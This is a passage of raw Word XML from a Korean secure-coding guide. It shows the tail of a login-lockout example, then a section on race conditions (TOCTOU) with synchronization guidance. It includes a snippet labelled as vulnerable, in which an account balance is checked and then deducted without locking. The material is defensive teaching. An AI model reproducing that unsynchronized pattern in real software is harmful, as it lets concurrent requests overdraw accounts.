          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] 5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실패</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잠금</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>분</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public boolean login(String id, String pw, HttpSession session) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    int failCount = loginService.getFailCount(id);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (failCount &gt;= 5) throw new LockedException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>잠금</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>: 30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>분</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>재시도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    boolean ok = userDao.checkPassword(id, pw);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!ok) loginService.incrementFailCount(id);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    else loginService.resetFailCount(id);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return ok;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>시간</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>상태</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경쟁조건</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검사시점과</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용시점</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(TOCTOU)</w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="006E1AB2">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>스레드 격리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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공유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자원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에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여러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프로세스가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접근하는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경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> synchronized, mutex </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등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동기화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구문을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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동기화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구문은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성능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영향을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최소화하기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위해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임계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코드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주변에만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적용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔액</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인과</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>차감</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사이에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개입</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (account.getBalance() &gt;= amount) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>여기서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>스레드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>잔액을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>먼저</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>차감할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>있음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    account.deduct(amount);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔액</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인과</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
